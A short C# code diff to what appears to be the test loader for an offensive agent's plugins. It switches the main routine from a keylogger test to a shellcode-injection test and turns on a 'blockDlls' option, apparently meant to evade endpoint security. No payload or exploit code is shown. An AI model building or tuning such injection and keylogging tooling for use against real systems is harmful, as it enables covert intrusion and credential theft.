@@ -21,14 +21,13 @@ namespace TestPluginLoader
         public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("commands");
         static async Task Main(string[] args)
         {
-            Console.WriteLine("Starting Keylogger.");
             //Task.Run(() => TestKeylogger());
-            Console.WriteLine("Delaying.");
-            await Task.Delay(10000);
-            Console.WriteLine("Done.");
+            await TestShellcodeInject();
+            //Console.WriteLine("Delaying.");
+            //await Task.Delay(10000);
+            //.WriteLine("Done.");
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
-            Console.WriteLine("Finished.");
             Console.ReadKey();
         }
 
@@ -63,7 +62,7 @@ namespace TestPluginLoader
 
         static async Task TestShellcodeInject()
         {
-            string json = "{\"blockDlls\":false , \"output\":true}";
+            string json = "{\"blockDlls\":true , \"output\":true}";
 
             Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(json);
 
